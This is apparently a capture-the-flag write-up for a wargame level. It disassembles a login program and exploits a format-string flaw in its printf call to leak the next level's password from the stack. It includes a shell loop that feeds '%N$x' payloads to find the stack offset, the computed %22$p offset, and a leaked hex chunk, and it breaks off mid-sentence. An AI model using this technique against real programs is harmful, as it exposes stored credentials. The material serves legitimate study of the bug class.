@@ -1,0 +1,63 @@
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username:
+--[ Password:
+*****************************************
+ does not have access!
+ 
+# We start by reading the asm
+
+(gdb) x /s 0x400bb0
+0x400bb0:	 "r"
+(gdb) x /s 0x400bb2
+0x400bb2:	 "/home/users/level03/.pass"
+4008a8:	e8 53 fe ff ff       	callq  400700 <fopen@plt>
+
+400818:    48 81 ec 20 01 00 00     sub    $0x120,%rsp # taille de la stack 288
+400909:    48 8d 85 60 ff ff ff     lea    -0xa0(%rbp),%rax # emplacement du read -> .pass
+
+# The prog open the file containing the pass and save it in the stack
+
+# When the prog is called, it print with a printf the username
+--[ Username: coucou
+--[ Password: cou
+*****************************************
+coucou does not have access!
+
+400a96:	48 8d 45 90          	lea    -0x70(%rbp),%rax
+400a9a:	48 89 c7             	mov    %rax,%rdi
+400a9d:	b8 00 00 00 00       	mov    $0x0,%eax
+400aa2:	e8 19 fc ff ff       	callq  4006c0 <printf@plt>
+
+# We try a format attack string on this printf because the printf only take a string stored at -0x70(%rbp)
+https://owasp.org/www-community/attacks/Format_string_attack
+
+# We test
+--[ Username: %p
+--[ Password:
+*****************************************
+0x7fffffffe4c0 does not have access!
+
+# We script to find the content of our print in the stack
+for i in {0..50}; do python -c "print 'aaaa %$i\$x'" | ./level02 | grep 'access!'; done
+
+# At the 28 pos, we find our aaaa hex
+aaaa 61616161 does not have access!
+
+# SO, 0xa0 (where .pass is stored) | 0x70 (where our username stored)
+>>> 0x70
+112
+>>> 0xa0
+160
+
+0xa0 - 0x70 = 48
+
+# Since the stack is 8 bytes aligned, we divided 48 by 8 -> 6, so we now have to check the content of print at the 28 - 6 pos, %22$p
+0x756e505234376848
+
+# Flag is size 40 because len(flag) 
+
+So we check 
